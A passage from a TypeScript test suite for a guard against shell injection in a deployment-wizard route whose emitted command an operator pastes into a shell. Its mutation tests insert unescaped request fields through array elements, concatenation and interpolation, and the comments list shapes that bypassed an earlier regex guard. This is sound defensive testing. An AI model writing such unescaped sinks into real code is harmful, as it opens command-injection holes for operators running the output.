      ANCHOR_PARAMS,
      "  deployParams.loomTenantHint = q('session.claims.oid', adminOid);\r\n" + ANCHOR_PARAMS,
    );
    expect(unsafeEmissions(stripComments(mutated))).toEqual([]);
  });

  it('CONTROL — a vanished emission scope fails CLOSED, it does not go quiet', () => {
    // A guard over an empty population is green and blind. If the handler ever
    // stops being locatable, the classifier must say so rather than find
    // nothing. The AST scope has no END marker at all, so the #3955 "marker
    // MOVES" case (I) cannot exist — it is pinned below anyway, because the
    // absence of a hazard is worth an assertion when a previous revision had it.
    expect(unsafeEmissions('export const POST = 1;')).toEqual([
      'emission scope not found — the POST handler body could not be located',
    ]);
  });

  // ── THE FOUR #3955 SHAPES, PINNED ─────────────────────────────────────────
  // Each of these was MEASURED green (RC=0, 45/45) against the regex classifier
  // by mutating this same route and running this same suite. They are the cases
  // the AST walk exists for, so each is pinned with the finding it must produce.

  it('BYPASS A — a bare member expression as a command-array element is flagged', () => {
    // No assignment, no `${…}`, no `+`. Under the regex classifier no rule
    // looked at array ELEMENTS at all, so this was not "missed" — it was
    // outside every question the guard asked. It is a live sink: the array is
    // `.join(' ')`ed straight into the shell command the operator pastes.
    const mutated = mutate(
      routeSource(),
      ANCHOR_CMD,
      '          ((body as any).tenantHint),\r\n' + ANCHOR_CMD,
    );
    const findings = unsafeEmissions(mutated);
    expect(findings.join('\n')).toContain('array element is not a static literal');
    expect(findings.join('\n')).toContain('tenantHint');
  });

  it("BYPASS D-prime — a deployParams RHS that only MENTIONS q() is flagged", () => {
    // The reported D was caught by two OTHER detectors (the `q('` count and the
    // runtime key pin). D′ evades all three: a VARIABLE q-argument keeps the
    // `q('` count unchanged, and a guard on a field no request body in this
    // suite sends keeps the key out of the emitted set. Only provenance catches
    // it — the RHS is a call to `String`, not to `q`.
    const mutated = mutate(
      routeSource(),
      ANCHOR_PARAMS,
      "  const hintField = 'appRegistration.tenantHint';\r\n"
      + '  if ((body as any).tenantHint) deployParams.loomTenantHint = '
      + 'String(q(hintField, String((body as any).tenantHint)));\r\n'
      + ANCHOR_PARAMS,
    );
    const code = mutated;
    const findings = unsafeEmissions(code);
    expect(findings.join('\n')).toContain('loomTenantHint is neither a static literal nor a q() call');
    // …and the two detectors that DO NOT catch it, measured in the same run so
    // the claim above is checked rather than remembered.
    expect((stripComments(code).match(/\bq\('/g) ?? []).length).toBe(5);
  });

  it('BYPASS G — a concatenation sink in the RESPONSE OBJECT is flagged', () => {
    // Past the old REGION_END, therefore unclassified by the regex version. The
    // response body is a paste source too: `apply.deployParams` and
    // `apply.bootstrapScript` are what the wizard shows the operator to copy.
    const mutated = mutate(
      routeSource(),
      '      note:',
      "      tenantHint: 'TENANT=' + String((body as any).tenantHint),\r\n      note:",
    );
    expect(unsafeEmissions(mutated).join('\n')).toContain('string concatenation in the emission region');
  });

  it('BYPASS I — an EARLIER response return cannot relocate the scope end', () => {
    // The regex classifier ended its region at the FIRST `return
    // NextResponse.json({`, so adding an earlier one shrank the region — while
    // still clearing the 400-char floor and still holding its two
    // interpolations, so no floor noticed — and a sink beyond it went
    // unclassified. The AST scope is the handler's own subtree, so there is no
    // end marker to move: the sink is inside the scope wherever it sits.
    const mutated = mutate(
      routeSource(),
      ANCHOR_PARAMS,
      '  if ((body as any).ping) return NextResponse.json({ ok: true });\r\n'
      + "  deployParams.loomTenantHint = \"'\" + String((body as any).tenantHint) + \"'\";\r\n"
      + ANCHOR_PARAMS,
    );
    const findings = unsafeEmissions(mutated);
    expect(findings.join('\n')).toContain('loomTenantHint');
    expect(findings.join('\n')).toContain('string concatenation in the emission region');
  });

  it('BYPASS E — an interpolation that merely CONTAINS a q() call is flagged', () => {
    // Reported in round 2 of #3929's review and measured NOT to be a bypass
    // there (the pinned interpolation COUNT caught it). Provenance closes the
    // class rather than the instance: `${x || q('lit', y)}` is not a q() call,
    // it is an expression that ends in one, and the count assertion would not
    // have caught a variant that kept the interpolation count at two.
    const mutated = mutate(
      routeSource(),
      ANCHOR_CMD,
      '          `TENANT_HINT=${((body as any).tenantHint) || q(\'x\', \'\')}`,\r\n' + ANCHOR_CMD,
    );
    expect(unsafeEmissions(mutated).join('\n')).toContain('interpolation not routed through q()');
  });

  it('CONTROL — a comment containing an unsafe-looking sink is NOT a finding', () => {
    // The regex classifier needed `stripComments` to avoid classifying prose.
    // The AST walk never sees a comment, and this pins that so the stripping
    // step is not reintroduced as though it were load-bearing.
    const mutated = mutate(
      routeSource(),
      ANCHOR_PARAMS,
      '  // deployParams.loomTenantHint = "\'" + (body as any).tenantHint + "\'";\r\n' + ANCHOR_PARAMS,
    );
    expect(unsafeEmissions(mutated)).toEqual([]);
  });

  // ── RUNTIME DETECTOR — independent of source syntax entirely ──────────────
  it('emits exactly the pinned deployParams keys, per mode', async () => {
    const { POST } = await import('../identity/route');
    const keys = async (body: any) => {
      const res = await POST(postReq(body), undefined as any);
      expect(res.status).toBe(200);
      return Object.keys((await res.json()).apply.deployParams).sort();
    };

    // A SIXTH key appearing here goes red whatever syntax produced it — a
    // source-scan can be out-thought, and an emitted key cannot be hidden from
    // a request shape this test actually drives. It CAN be hidden from one this
    // test does not: a write guarded by a field none of the three bodies below
    // sends never reaches the emitted set, and stays green. That is the limit
    // of this detector, and it is part of #3955.
    expect(await keys({})).toEqual(['loomMsalAppReg', 'loomTenantAdminOid']);
    expect(
      await keys({ appRegistration: { mode: 'disable' }, bootstrapAdmin: { mode: 'self' } }),
    ).toEqual(['loomMsalAppReg', 'loomMsalClientId', 'loomTenantAdminOid']);
    expect(
      await keys({
        appRegistration: { mode: 'existing', existingClientId: VALID_CLIENT_ID },
        bootstrapAdmin: { mode: 'group', groupId: VALID_GROUP_ID },
      }),
    ).toEqual(['loomMsalAppReg', 'loomMsalClientId', 'loomTenantAdminGroupId']);
  });
});
